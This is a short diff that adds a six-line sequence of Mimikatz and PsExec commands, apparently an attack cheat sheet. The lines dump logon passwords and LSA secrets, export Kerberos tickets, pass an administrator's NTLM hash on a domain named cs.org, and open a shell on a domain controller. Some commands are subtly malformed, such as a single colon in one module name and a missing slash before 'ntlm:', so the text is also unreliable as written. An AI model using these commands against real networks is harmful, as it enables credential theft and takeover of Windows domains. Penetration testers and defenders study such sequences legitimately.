@@ -1,0 +1,6 @@
+privilege::debug
+sekurlsa:logonpasswords
+sekurlsa::pth  /user:Administrador /domain:cs.org ntlm:
+PsExec.exe \\hostname-dc cmd
+lsadump::lsa
+kerberos::list /export
